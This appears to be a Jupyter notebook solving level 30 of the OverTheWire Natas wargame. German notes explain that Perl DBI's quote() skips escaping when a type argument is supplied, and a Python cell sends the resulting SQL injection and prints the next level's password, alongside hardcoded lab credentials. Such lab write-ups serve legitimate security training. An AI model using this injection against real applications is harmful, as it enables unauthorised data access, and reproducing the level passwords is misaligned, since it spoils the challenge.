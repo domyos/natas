{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# natas 30\n",
    "* wie wir [hier](https://stackoverflow.com/a/40275686) sehen können hat die verwendete Funktion quote die Eigenschaft input nicht zu escapeb wenn als zweiter Parameter ein entsprechender Datentyp verwendet wird.\n",
    "* aus diesem Grund bauen wir einen request mit sqli und typ parameter "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "username: natas31\n",
      "password: hay7aecuungiuKaezuathuk9biin0pu1\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "import re\n",
    "\n",
    "url = 'http://natas30.natas.labs.overthewire.org/index.pl'\n",
    "\n",
    "session = requests.Session()\n",
    "session.auth = ('natas30', 'wie9iexae0Daihohv8vuu3cei9wahf0e')\n",
    "\n",
    "# 2 ist der hier angegebene type: https://metacpan.org/pod/DBI#quote\n",
    "args = { 'username': 'natas30', 'password': [\"'' or 1\", 2] }\n",
    "result = session.post(url,  data=args)\n",
    "\n",
    "password = re.search('here is your result:<br>natas31(.*)<div', result.text).group(1)\n",
    "print('username:', 'natas31')\n",
    "print ('password:', password)\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
